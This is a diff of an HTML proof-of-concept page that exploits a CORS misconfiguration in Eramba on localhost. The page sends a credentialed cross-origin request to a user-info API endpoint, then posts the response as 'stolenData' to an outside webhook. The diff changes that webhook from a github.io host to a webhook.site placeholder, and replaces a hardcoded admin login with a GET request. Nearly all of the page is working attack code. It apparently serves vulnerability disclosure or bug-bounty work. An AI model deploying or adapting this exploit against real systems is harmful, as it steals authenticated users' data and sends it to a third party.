@@ -1,29 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Eramba local CORS PoC (XHR Style)</title>
+  <title>Eramba Local CORS PoC (XHR Style)</title>
 </head>
 <body>
-  <h2>Eramba local CORS Exploit Demo (XHR)</h2>
+  <h2>Eramba Local CORS Exploit Demo (XHR)</h2>
   <button onclick="exploit()">Exploit via XMLHttpRequest</button>
 
   <script>
     function exploit() {
       var req = new XMLHttpRequest();
-      req.onload = function() {
-        alert("Response from localhost:\n\n" + this.responseText);
+      req.onload = function () {
+        alert("Response from Eramba:\n\n" + this.responseText);
 
-        // Optional: Exfiltrate to your server
+        // Optional: Exfiltrate to your own webhook
         var exfil = new XMLHttpRequest();
-        exfil.open("POST", "https://hunter-4321.github.io", true);
+        exfil.open("POST", "https://webhook.site/your-id", true); // Replace with your webhook
         exfil.setRequestHeader("Content-Type", "application/json");
-        exfil.send(JSON.stringify({ response: this.responseText }));
+        exfil.send(JSON.stringify({ stolenData: this.responseText }));
       };
 
-      req.open("POST", "https://localhost:8443/users/info", true);
+      // This is the correct endpoint and method
+      req.open("GET", "https://localhost:8443/system-api/users/info", true);
       req.withCredentials = true;
-      req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      req.send("login=admin&password=admin1234");
+      req.send();
     }
   </script>
 </body>
